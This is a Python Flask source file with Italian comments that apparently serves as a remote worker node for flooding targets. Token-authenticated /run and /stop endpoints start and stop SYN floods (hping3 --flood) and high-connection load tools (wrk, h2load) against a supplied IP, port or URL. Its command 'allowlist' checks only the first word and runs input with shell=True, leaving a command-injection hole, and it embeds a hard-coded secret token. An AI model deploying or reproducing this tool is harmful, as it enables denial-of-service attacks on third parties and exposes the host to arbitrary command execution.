from flask import Flask, request, jsonify
import subprocess, os, signal, threading, time

app = Flask(__name__)
process = None

# 🔒 Token segreto integrato
SECRET_TOKEN = "SECRET_WORKER_TOKEN_123"

# Preset consentiti (allowlist)
ALLOWED_PRESETS = [
    "wrk -t30 -c100000 {target}",
    "h2load -n 10000 -c 100000 -t 30 {target}",
    "hping3 -S -p {port} -d 9999 --flood {ip}",
    "tx_program -p {port} -d 30 -t 600 {ip}"
]

# Funzione per eseguire il comando
def run_command(cmd, duration):
    global process
    if cmd not in ALLOWED_PRESETS and not any(cmd.startswith(p.split()[0]) for p in ALLOWED_PRESETS):
        return
    process = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid
    )
    start_time = time.time()
    while time.time() - start_time < duration:
        if process.poll() is not None:
            break
        time.sleep(0.5)
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    process = None

# Controllo token
def check_token(req):
    token = req.headers.get("Authorization")
    return token == f"Bearer {SECRET_TOKEN}"

# Endpoint /run
@app.route("/run", methods=["POST"])
def run():
    if not check_token(request):
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    data = request.get_json()
    if not data or "cmd" not in data or "duration" not in data:
        return jsonify({"status": "error", "message": "Dati incompleti"}), 400
    cmd = data["cmd"]
    duration = int(data["duration"])
    threading.Thread(target=run_command, args=(cmd, duration), daemon=True).start()
    return jsonify({"status": "ok", "message": "Comando avviato"}), 200

# Endpoint /stop
@app.route("/stop", methods=["POST"])
def stop():
    if not check_token(request):
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    global process
    if process and process.poll() is None:
        try:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
        process = None
        return jsonify({"status": "ok", "message": "Processo fermato"}), 200
    return jsonify({"status": "ok", "message": "Nessun processo in esecuzione"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
